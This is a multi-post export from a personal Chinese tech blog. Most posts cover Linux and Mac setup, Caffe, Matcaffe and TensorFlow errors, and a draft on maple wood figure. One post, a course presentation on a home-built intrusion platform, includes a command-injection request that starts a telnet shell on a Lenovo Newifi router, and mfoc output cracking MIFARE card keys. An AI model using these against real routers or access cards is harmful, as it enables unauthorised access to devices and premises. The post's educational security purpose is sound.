https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;menpo&#x2F;</span><br><span class="line">conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;pytorch&#x2F;</span><br><span class="line"></span><br><span class="line">conda config --remove channels defaults</span><br><span class="line">conda config --set show_channel_urls yes</span><br><span class="line"></span><br><span class="line">## 安装 Shadowsocks 客户端</span><br><span class="line">sudo add-apt-repository ppa:hzwhuang&#x2F;ss-qt5</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install shadowsocks-qt5</span><br><span class="line"></span><br><span class="line">## 可以安装 Chrome 扩展 SwitchyOmega。项目地址：https:&#x2F;&#x2F;github.com&#x2F;FelisCatus&#x2F;SwitchyOmega&#x2F;releases</span><br><span class="line"></span><br><span class="line">sudo apt-get install gimp wireshark zeal</span><br><span class="line"></span><br><span class="line">## 辞典 https:&#x2F;&#x2F;github.com&#x2F;goldendict&#x2F;goldendict http:&#x2F;&#x2F;www.cnblogs.com&#x2F;F-32&#x2F;p&#x2F;4888387.html</span><br><span class="line"></span><br><span class="line">## QuiteRSS 阅读器</span><br><span class="line"></span><br><span class="line">sudo add-apt-repository ppa:quiterss&#x2F;quiterss</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install quiterss</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="关于CUDA"><a href="#关于CUDA" class="headerlink" title="关于CUDA"></a>关于CUDA</h3><p>安装之前一定要看好安装手册中的系统要求。目前CUDA9.1只支持4.4.0版的Kernel，并且不能用<code>linux kernel 4.4.0-116</code>（<a href="http://s1nh.org/post/littlebug/">参考</a>）。可以参考下面的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install linux-headers-4.4.0-112 linux-headers-4.4.0-112-generic linux-image-4.4.0-112-generic linux-image-extra-4.4.0-112-generic linux-signed-image-4.4.0-112-generic</span><br></pre></td></tr></table></figure>

<p>然后重启系统切换到4.4.0内核再装cuda</p>
<h3 id="Matlab-Crash-with-NVIDIA-361-driver"><a href="#Matlab-Crash-with-NVIDIA-361-driver" class="headerlink" title="Matlab Crash with NVIDIA 361 driver"></a>Matlab Crash with NVIDIA 361 driver</h3><p>装完Cuda8.0以后，Matlab无法启动，有两个解决办法(<a href="http://askubuntu.com/questions/765455/how-to-run-matlab-2016a-with-nvidia-drivers-of-gtx-960-in-ubuntu-16-04">详细教程</a>：</p>
<ol>
<li>通过<code>matlab -softwareopengl</code>启动matlab</li>
<li><code>sudo add-apt-repository ppa:graphics-drivers/ppa</code> 加这个源，然后安装新版驱动</li>
</ol>
<p>由于我已经用deb安装Cuda了，修改驱动会被自动remove掉Cuda，所以就通过第一种方法禁用硬件OpenGL加速。</p>
<h3 id="禁止USB-3-0设备唤醒电脑"><a href="#禁止USB-3-0设备唤醒电脑" class="headerlink" title="禁止USB 3.0设备唤醒电脑"></a>禁止USB 3.0设备唤醒电脑</h3><p>把<code>echo &quot;XHC&quot; &gt; /proc/acpi/wakeup</code> 添加到 <code>/etc/rc.local</code></p>
<p>参考:<br>　　1. <a href="http://www.thomasmonaco.com/prevent-usb-devices-waking-ubuntu-sleep/">http://www.thomasmonaco.com/prevent-usb-devices-waking-ubuntu-sleep/</a><br>　　2. <a href="http://blog.163.com/ya_mzy/blog/static/19959325520131510721828/">http://blog.163.com/ya_mzy/blog/static/19959325520131510721828/</a></p>
<h3 id="添加SSH到Github"><a href="#添加SSH到Github" class="headerlink" title="添加SSH到Github"></a>添加SSH到Github</h3><p>参考 <a href="https://segmentfault.com/a/1190000002645623">https://segmentfault.com/a/1190000002645623</a></p>
<h2 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h2><p>对于mac，我们要</p>
<ul>
<li>安装brew（一个类似apt的包管理系统）</li>
<li>更换为国内源</li>
<li>使用brew和brew cask安装必备软件（brew cask是一个管理GUI软件的系统）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot; #安装brew</span><br><span class="line"></span><br><span class="line">echo &#39;export HOMEBREW_BOTTLE_DOMAIN&#x3D;https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;homebrew-bottles&#39; &gt;&gt; ~&#x2F;.bash_profile</span><br><span class="line">source ~&#x2F;.bash_profile #切换至国内bottles</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">brew install wget polipo node libusb python sqlite </span><br><span class="line">brew cask install qq  alfred  neteasemusic google-chrome the-unarchiver thunder weibox mplayerx qiyimedia #必备软件</span><br><span class="line">brew cask install pycharm visual-studio-code mou sourcetree anaconda #安装写代码的软件</span><br><span class="line">brew cask install  shadowsocksx-ng torbrowser #翻墙</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<hr>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>Debian</tag>
        <tag>Mac</tag>
        <tag>Brew</tag>
      </tags>
  </entry>
  <entry>
    <title>在anaconda下安装caffe失败</title>
    <url>/post/setup-caffe-without-anaconda/</url>
    <content><![CDATA[<blockquote>
<p>Python 跟 Python3 完全就是两种语言</p>
</blockquote>
<h3 id="0x00-import-caffe-FAILED"><a href="#0x00-import-caffe-FAILED" class="headerlink" title="0x00 import caffe FAILED"></a>0x00 import caffe FAILED</h3><p>环境为 <code>Ubuntu 16</code> <code>cuda 8.0</code> <code>NVIDIA 361.77</code> <code>Anaconda2</code>。昨天莫名其妙Caffe不能用了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import caffe</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&#x2F;home&#x2F;duchengyao&#x2F;project&#x2F;caffe&#x2F;python&#x2F;caffe&#x2F;__init__.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from .pycaffe import Net, SGDSolver, NesterovSolver, AdaGradSolver, RMSPropSolver, AdaDeltaSolver, AdamSolver</span><br><span class="line">  File &quot;&#x2F;home&#x2F;duchengyao&#x2F;project&#x2F;caffe&#x2F;python&#x2F;caffe&#x2F;pycaffe.py&quot;, line 13, in &lt;module&gt;</span><br><span class="line">    from ._caffe import Net, SGDSolver, NesterovSolver, AdaGradSolver, \</span><br><span class="line">ImportError: &#x2F;home&#x2F;duchengyao&#x2F;project&#x2F;caffe&#x2F;python&#x2F;caffe&#x2F;..&#x2F;..&#x2F;build&#x2F;lib&#x2F;libcaffe.so.1.0.0-rc3: undefined symbol: _ZN2cv8imencodeERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERKNS_11_InputArrayERSt6vectorIhSaIhEERKSB_IiSaIiEE</span><br></pre></td></tr></table></figure>

<p>各种折腾都无效，重装Anaconda以后错误消失，<code>import caffe</code> 成功。</p>
<h3 id="0x01-import-FAILED-again-after-“-conda-install-opencv”"><a href="#0x01-import-FAILED-again-after-“-conda-install-opencv”" class="headerlink" title="0x01 import FAILED again after “$conda install opencv”"></a>0x01 import FAILED again after “$conda install opencv”</h3><p>用 <code>conda install opencv</code> 安装完Opencv后，又出现了同样的错误提示，卸载后错误消失。</p>
<p>Conda 安装后的Opencv 版本为<code>2.4.10</code>，而系统apt安装的版本为<code>2.4.9.1</code>。我尝试从conda 安装2.4.9版，可是需要处理很多conflict。</p>
<p>最后实在走投无路了准备换成Anaconda3，环境搭建完成后运行程序的时候简直尴尬了，各种库不兼容。终于知道为啥老鸟们调侃Python 跟Python3完全是两种语言了</p>
<h3 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h3><p>暂时的解决方案为<strong>放弃anaconda</strong>，全部用apt安装软件包，使用系统默认的Opencv，运行成功。</p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>caffe</tag>
        <tag>anaconda</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Matcaffe</title>
    <url>/post/setup-matcaffe/</url>
    <content><![CDATA[<p>配置Matcaffe的时候碰到了两个小坑，记录一下：</p>
<p>第一个坑：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invalid MEX-file &#39;&#x2F;root&#x2F;caffe&#x2F;matlab&#x2F;+caffe&#x2F;private&#x2F;caffe_.mexa64&#39;: &#x2F;matlab&#x2F;r2016a&#x2F;bin&#x2F;glnxa64&#x2F;..&#x2F;..&#x2F;sys&#x2F;os&#x2F;glnxa64&#x2F;libstdc++.so.6: version &#96;GLIBCXX_3.4.20&#39; not found (required by &#x2F;root&#x2F;caffe&#x2F;matlab&#x2F;+caffe&#x2F;private&#x2F;caffe_.mexa64)</span><br></pre></td></tr></table></figure>
<p>第二个坑与前一篇文章《<a href="/post/setup-caffe-without-anaconda/">在anaconda下安装caffe失败</a>》错误相同。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invalid MEX-file</span><br><span class="line">&#39;&#x2F;home&#x2F;xw&#x2F;caffeBuild&#x2F;caffe-master&#x2F;matlab&#x2F;+caffe&#x2F;private&#x2F;caffe_.mexa64&#39;:</span><br><span class="line">&#x2F;home&#x2F;xw&#x2F;caffeBuild&#x2F;caffe-master&#x2F;matlab&#x2F;+caffe&#x2F;private&#x2F;caffe_.mexa64: undefined</span><br><span class="line">symbol:</span><br><span class="line">_ZN2cv8imencodeERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERKNS_11_InputArrayERSt6vectorIhSaIhEERKSB_IiSaIiEE</span><br><span class="line"></span><br><span class="line">Error in caffe.set_mode_cpu (line 5)</span><br><span class="line">caffe_(&#39;set_mode_cpu&#39;);</span><br><span class="line"></span><br><span class="line">Error in caffe.run_tests (line 6)</span><br><span class="line">caffe.set_mode_cpu();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="0x01-解决方法"><a href="#0x01-解决方法" class="headerlink" title="0x01 解决方法"></a>0x01 解决方法</h3><h4 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h4><p><code>export LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libstdc++.so.6</code></p>
<h4 id="坑2：-修改软链接"><a href="#坑2：-修改软链接" class="headerlink" title="坑2： 修改软链接"></a>坑2： 修改软链接</h4><p>原因是Caffe用系统的opencv编译，但是运行matcaffe时链接了matlab的opencv版本（<a href="https://github.com/BVLC/caffe/issues/3934%EF%BC%89">https://github.com/BVLC/caffe/issues/3934）</a></p>
<p>进入matlab的安装目录``，修改了如下软链接，问题解决</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bopencv_core.so.2.4 -&gt; &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libopencv_core.so.2.4.9</span><br><span class="line">libopencv_highgui.so.2.4 -&gt; &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libopencv_highgui.so.2.4.9</span><br><span class="line">libopencv_imgproc.so.2.4 -&gt; &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libopencv_imgproc.so.2.4.9</span><br></pre></td></tr></table></figure>

<blockquote>
<p>网上还有另一种办法，采用<code>export LD_PRELOAD</code>修改链接库。可是我不太懂得原理，就没用这种办法，欢迎在下面留言，教我怎么用^_^</p>
</blockquote>
<h3 id="0x02-测试matcaffe"><a href="#0x02-测试matcaffe" class="headerlink" title="0x02 测试matcaffe"></a>0x02 测试matcaffe</h3><p>这一步运行一个demo来测试matcaffe</p>
<ol>
<li>运行<code>./scripts/download_model_binary.py models/bvlc_reference_caffenet</code> 下载训练好的文件</li>
<li>下载(synset_words.txt)[<a href="http://qiniu.s1nh.org/synset_words.txt]%E5%88%B0%60./matlab/demo%60%E7%9B%AE%E5%BD%95">http://qiniu.s1nh.org/synset_words.txt]到`./matlab/demo`目录</a></li>
<li>在<code>./matlab/demo</code>目录创建<code>test.m</code> 内容为如下代码。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%参考http:&#x2F;&#x2F;www.aichengxu.com&#x2F;view&#x2F;2422137</span><br><span class="line">clear</span><br><span class="line">clc</span><br><span class="line"></span><br><span class="line">im &#x3D; imread(&#39;..&#x2F;..&#x2F;examples&#x2F;images&#x2F;cat.jpg&#39;);%读取图片</span><br><span class="line">figure;imshow(im);%显示图片</span><br><span class="line">[scores, maxlabel] &#x3D; classification_demo(im, 0);%获取得分第二个参数0为CPU，1为GPU</span><br><span class="line">maxlabel %查看最大标签是谁</span><br><span class="line">figure;plot(scores);%画出得分情况</span><br><span class="line">axis([0, 999, -0.1, 0.5]);%坐标轴范围</span><br><span class="line">grid on %有网格</span><br><span class="line"></span><br><span class="line">fid &#x3D; fopen(&#39;synset_words.txt&#39;, &#39;r&#39;);</span><br><span class="line">i&#x3D;0;</span><br><span class="line">while ~feof(fid)</span><br><span class="line">    i&#x3D;i+1;</span><br><span class="line">    lin &#x3D; fgetl(fid);</span><br><span class="line">    lin &#x3D; strtrim(lin);</span><br><span class="line">    if(i&#x3D;&#x3D;maxlabel)</span><br><span class="line">        fprintf(&#39;the label of %d is %s\n&#39;,i,lin)</span><br><span class="line">        break</span><br><span class="line">    end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>运行后结果如下：</p>
<p><img src="http://qiniu.s1nh.org/Blog_matcaffe-helloworld.png" alt="matcaffe helloworld" title="matcaffe helloworld"></p>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>matlab</tag>
        <tag>matcaffe</tag>
      </tags>
  </entry>
  <entry>
    <title>在 Macbook 中美美的运行 Ubuntu</title>
    <url>/post/setup-ubuntu-in-macbook/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/mbp-2016-linux-device-status.png-QNthin"></p>
<span id="more"></span>

<h2 id="Mac-的启动菜单不支持-USB-HUB"><a href="#Mac-的启动菜单不支持-USB-HUB" class="headerlink" title="Mac 的启动菜单不支持 USB HUB"></a>Mac 的启动菜单不支持 USB HUB</h2><p>之前一直把ubuntu安装在U盘里，这样无论如何换电脑，都可以马上工作。然而新款的macbook只有type-c接口，在使用type-c转USB的Hub之后，启动菜单（包括rEFInd）无法识别U盘（我的Sandisk Extreme PRO不能用；另外一个 USB2.0 的U盘使用正常）。据说使用hootoo的usb hub可以解决这个问题（有待考证）</p>
<p><strong>尝试1</strong><br>第一次尝试的方案是将笔记本硬盘分为三个驱，分别放置<code>OS X</code>，<code>Ubuntu Live CD</code>, <code>待安装的 Ubuntu 系统</code>。通过启动第二个磁盘的Live CD 将Ubuntu安装到第3个分区。然而在安装时会报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your installation CD-ROM couldn&#39;t be mounted. This probably means that the CD-ROM was not in the drive. If so you can insert it and try again.</span><br></pre></td></tr></table></figure>

<p><strong>尝试2</strong></p>
<p>最后我用虚拟机把 Ubuntu 安装在U盘里，然后dd到Macbook的一个分区，就可以通过<a href="http://www.rodsbooks.com/refind/">rEFInd</a>来启动了。<br>不过启动后因为找不到EFI和SWAP分区，会自动进入单用户模式。这时需要注释掉/etc/fstab中关于EFI和SWAP的两行。</p>
<h2 id="驱动问题"><a href="#驱动问题" class="headerlink" title="驱动问题"></a>驱动问题</h2><p>安装好Ubuntu以后，触摸板、键盘、Wi-Fi都不好用。要先准备一个外接网卡、外接键盘鼠标；查看自己的Mac版本；然后跟着mbp-2016-linux项目配置好驱动。</p>
<p>即使安装好了驱动，一眼有些功能无法使用。已知的问题有：</p>
<ol>
<li>内置音箱、音频插孔无声音（可以通过外接声卡或HDMI获取声音）</li>
<li>休眠后无法唤醒（配置不好的话，盖上盖子以后再打开就GG了）</li>
<li>TouchID无法使用（我的本本没有这么高档的功能）</li>
<li>内建 Wi-Fi 只有 Macbook Pro 13.1 可以使用</li>
</ol>
<h2 id="高分屏下使用-XFCE"><a href="#高分屏下使用-XFCE" class="headerlink" title="高分屏下使用 XFCE"></a>高分屏下使用 XFCE</h2><p>可以直接按照<a href="https://wiki.archlinux.org/index.php/HiDPI#Xfce">这个链接</a>来配置。</p>
<h2 id="增加-XFCE4-的窗口边界大小"><a href="#增加-XFCE4-的窗口边界大小" class="headerlink" title="增加 XFCE4 的窗口边界大小"></a>增加 XFCE4 的窗口边界大小</h2><p><img src="https://xubuntu.org/wp-content/uploads/2012/04/resize_method_4.png"></p>
<p>XFCE4 的默认皮肤 Greybird 超级牛逼 —— 窗口的边界只有1个像素，如果你要调整窗口大小，必须用鼠标瞄准窗口边界的那一个像素，并且还要期待按下左键的时候手不能抖。</p>
<p><a href="http://sevkeifert.blogspot.com/2014/12/increase-window-border-size-in-xubuntu.html">解决方案 1</a> : 这个方案会让window的边界大一点，感觉可能有点丑；</p>
<p><a href="http://xubuntu.org/news/window-resizing-in-xubuntu-and-xfce/">解决方案 2</a>: 设置一个修改窗口大小的快捷键。</p>
<p>XFCE4 支持三指拖拽<br>无论是 synaptics 还是 libinput 都不支持三指拖拽，之前只能使用非官方的mtrack或<a href="https://github.com/daveriedstra/libinput-gestures">libinput-gesture</a>来解决问题，然而就在前些日子，有位大牛写了段脚本（mod libinput-gesture 的三指拖拽功能也是他写的）</p>
<p>请使用这个很牛逼的脚本：<a href="https://github.com/daveriedstra/draggy">draggy</a></p>
]]></content>
  </entry>
  <entry>
    <title>「tensorflow」 Variable was uninitialized</title>
    <url>/post/tensorflow-bug2/</url>
    <content><![CDATA[<p>Initialize:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tensorflow as tf</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">dir &#x3D; &#39;.&#x2F;model&#x2F;tf_savedmodel&#39;</span><br><span class="line">zeros &#x3D; tf.constant(np.zeros([1, 640, 960, 3]), dtype&#x3D;float)</span><br></pre></td></tr></table></figure>

<p>Work:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">model &#x3D; tf.saved_model.load(dir)</span><br><span class="line">output &#x3D; model.signatures[&#39;serving_default&#39;](zeros)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">model &#x3D; tf.saved_model.load(dir)</span><br><span class="line">output &#x3D; model(zeros)</span><br></pre></td></tr></table></figure>

<p>Failed:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">model &#x3D; tf.saved_model.load(dir).signatures[&#39;serving_default&#39;]</span><br><span class="line">output &#x3D; model(zeros)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tensorflow.python.framework.errors_impl.FailedPreconditionError:  Error while reading resource variable conv5_block17_0_bn&#x2F;gamma_96932 from Container: localhost. This could mean that the variable was uninitialized. Not found: Resource localhost&#x2F;conv5_block17_0_bn&#x2F;gamma_96932&#x2F;N10tensorflow3VarE does not exist.</span><br><span class="line">	 [[&#123;&#123;node StatefulPartitionedCall&#x2F;fusion_network&#x2F;conv5_block17_0_bn&#x2F;ReadVariableOp&#125;&#125;]] [Op:__inference_signature_wrapper_21102]</span><br><span class="line"></span><br><span class="line">Function call stack:</span><br><span class="line">signature_wrapper</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>几个简单的入侵检测方法</title>
    <url>/post/the-Constitution-of-a-Basic-Intrusion-System/</url>
    <content><![CDATA[<p><a href="http://qiniu.s1nh.org/Blog_the_Constitution_of_a_Basic_Intrusion_System.pdf"><img src="http://qiniu.s1nh.org/Blog_the_Constitution_of_a_Basic_Intrusion_System.png-QNthin" title="点击图片下载PPT，点击“阅读全文”查看文字版草稿"></a></p>
<p>可靠性导论的汇报PPT，介绍了我自己搭建的入侵检测平台，其中包含：</p>
<ul>
<li>Man-in-the-Middle Attack (MITM, 中间人攻击)</li>
<li>Lan Tap</li>
<li>WiFi Hacking</li>
<li>NFC Hacking</li>
<li>Software Defined Radio</li>
</ul>
<span id="more"></span>

<h2 id="Man-in-the-Middle-Attack-MITM-中间人攻击"><a href="#Man-in-the-Middle-Attack-MITM-中间人攻击" class="headerlink" title="Man-in-the-Middle Attack (MITM, 中间人攻击)"></a>Man-in-the-Middle Attack (MITM, 中间人攻击)</h2><ul>
<li>Phone Tapping (电话搭线攻击)</li>
</ul>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_01.gif"></p>
<ul>
<li>ARP Spoofing (ARP 欺骗)</li>
</ul>
<p>Attacker sends spoofed ARP messages onto a local area network, causing any traffic meant for that IP address to be sent to the attacker instead.（APT Defence Equipment，Firewall）</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_02.svg" alt="ARP_Spoofing"></p>
<h3 id="Lan-Tap"><a href="#Lan-Tap" class="headerlink" title="Lan Tap"></a>Lan Tap</h3><p>a small, simple device for monitoring Ethernet communications</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_03.png-QNthin"></p>
<p>RJ45 connector，T568B Pair</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_04.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_05.png-QNthin"></p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_06.png-QNthin"></p>
<p>Test</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_07.jpg-QNthin"></p>
<p>finish</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_08.jpg-QNthin"></p>
<p>sniff package</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_09.jpg-QNthin"></p>
<h3 id="WiFi-router（Lenovo-Newifi）"><a href="#WiFi-router（Lenovo-Newifi）" class="headerlink" title="WiFi router（Lenovo Newifi）"></a>WiFi router（Lenovo Newifi）</h3><p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_10.png-QNthin"></p>
<h4 id="CGI-vulnerability"><a href="#CGI-vulnerability" class="headerlink" title="CGI vulnerability"></a>CGI vulnerability</h4><p><a href="http://192.168.99.1/cgi-bin/luci/;stok=XXXXXXXX/admin/wifi_home">http://192.168.99.1/cgi-bin/luci/;stok=XXXXXXXX/admin/wifi_home</a> </p>
<p>newwifi/comcmd?cmd=busybox telnet -p 23|mfg2 telnet 1 </p>
<p>newwifi/comcmd?cmd=busybox%20telnetd%20-p%2023|mfg2%20telnet%201</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_11.png-QNthin"></p>
<h4 id="Add-TTL-Serial-Plug"><a href="#Add-TTL-Serial-Plug" class="headerlink" title="Add TTL Serial Plug"></a>Add TTL Serial Plug</h4><p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_12.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_13.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_14.jpeg"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_15.png-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_16.png-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_17.png-QNthin"></p>
<h2 id="NFC-Hacking-RDM8800"><a href="#NFC-Hacking-RDM8800" class="headerlink" title="NFC Hacking(RDM8800)"></a>NFC Hacking(RDM8800)</h2><p>RDM 8800 = Arduino + PN532</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_18.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_19.jpg-QNthin"></p>
<p>NFC List</p>
<pre><code>nfc-list uses libnfc 1.7.1
NFC device: pn532_uart:/dev/ttyUSB0 opened
1 ISO14443A passive target(s) found:
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
       UID (NFCID1): fa  d6  9c  08  
      SAK (SEL_RES): 08
</code></pre>
<p>mfoc -O mycard.mfd</p>
<pre><code>ISO/IEC 14443A (106 kbps) target:
ATQA (SENS_RES): 00  04  
* UID size: single
* bit frame anticollision supported
  UID (NFCID1): fa  d6  9c  08  
  SAK (SEL_RES): 08  
* Not compliant with ISO/IEC 14443-4
* Not compliant with ISO/IEC 18092

Fingerprinting based on MIFARE type Identification Procedure:
* MIFARE Classic 1K
* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1
* SmartMX with MIFARE 1K emulation
Other possible matches based on ATQA &amp; SAK values:

Try to authenticate to all sectors with default keys...
Symbols: &#39;.&#39; no key found, &#39;/&#39; A key found, &#39;\&#39; B key found, &#39;x&#39; both keys found
[Key: ffffffffffff] -&gt; [.............xx.]
[Key: a0a1a2a3a4a5] -&gt; [/............xx.]
[Key: d3f7d3f7d3f7] -&gt; [/............xx.]
[Key: 000000000000] -&gt; [/............xx.]
[Key: b0b1b2b3b4b5] -&gt; [/............xx.]
</code></pre>
<p>改进</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_20.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_21.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_22.jpg-QNthin"></p>
<h2 id="SDR-Software-Defined-Radio"><a href="#SDR-Software-Defined-Radio" class="headerlink" title="SDR - Software Defined Radio"></a>SDR - Software Defined Radio</h2><h3 id="电视棒（RTL2832U）："><a href="#电视棒（RTL2832U）：" class="headerlink" title="电视棒（RTL2832U）："></a>电视棒（RTL2832U）：</h3><p>USB DVB-T &amp; RTL-SDR Realtek RTL2832U &amp; R820T，这是（Realtek）的一个芯片型号，原本是做电视棒芯片的。</p>
<p>后来被人发现这个芯片具有非常广的频率接收范围，然后就被用来做sdr应用了，rtl的sdr应用。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_14.jpeg"></p>
<h3 id="HackRF"><a href="#HackRF" class="headerlink" title="HackRF"></a>HackRF</h3><ul>
<li>SDR peripheral capable of transmission or reception of radio signals from 1 MHz to 6 GHz.</li>
<li>Designed to enable test and development of modern and next generation radio technologies</li>
<li>HackRF One is an open source hardware platform that can be used as a USB peripheral or programmed for stand-alone operation.</li>
</ul>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_24.jpg-QNthin"></p>
<p><em>Alternative：bladeRF（support USB3.0，300MHz~3.8GHz）</em> </p>
<h3 id="Dump-1090"><a href="#Dump-1090" class="headerlink" title="Dump 1090"></a>Dump 1090</h3><p>ADS-B open-source software<br>a Mode S decoder specifically designed for RTLSDR devices.</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_25.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_26.jpg-QNthin"></p>
<h3 id="Antenna"><a href="#Antenna" class="headerlink" title="Antenna"></a>Antenna</h3><p>L ≈ C / F * 0.96</p>
<p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_27.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_28.png-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_29.png-QNthin"></p>
<h2 id="亚克力"><a href="#亚克力" class="headerlink" title="亚克力"></a>亚克力</h2><p><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_30.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_31.jpg-QNthin"><br><img src="http://qiniu.s1nh.org/Blog_Year-end-summary_32.jpg-QNthin"></p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>（草稿）虎纹枫木、絮纹枫木形成的秘密</title>
    <url>/post/the-mystery-of-figured-maple/</url>
    <content><![CDATA[<p>原文：<a href="http://www.lespaulforum.com/slubarticle/maple/figure.html">Go Figure! The Mystery of Figured Maple - By Mike Slubowski</a><br><a href="http://www.gobywalnut.com/figured-maple.htm">http://www.gobywalnut.com/figured-maple.htm</a></p>
<span id="more"></span>

<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Figured Maple</p>
<h2 id="纹理的类别"><a href="#纹理的类别" class="headerlink" title="纹理的类别"></a>纹理的类别</h2><p>有三种宽泛的图形，包括“正常图形”（纹理变化显示生长层，结等），“颜料图”和“特定图形”，这是由于纵向纤维在木。 具体的数字可以通过切割方法隐藏或增强，如四分之一锯，平（锯）等。</p>
<p><img src="http://www.lespaulforum.com/slubarticle/maple/fullimages/1_f.jpg-QNthin" alt="纹理的类别" title="A.横向 B.径向 C.切线"></p>
<p>虎纹或絮纹在活体树中主要作为颗粒在径向或切向方向上的垂直排列中的变化或变形，其导致称为条纹，起泡，卷曲，波浪和几个其它变化的常见图形类型。 在直径小于10英寸的树中很少发现可商购的图。 一旦它开始，它在随后的生长环变得更加显着。 波浪谷物在四肢和根附近是相当普遍，在那里它被局限在小区域。</p>
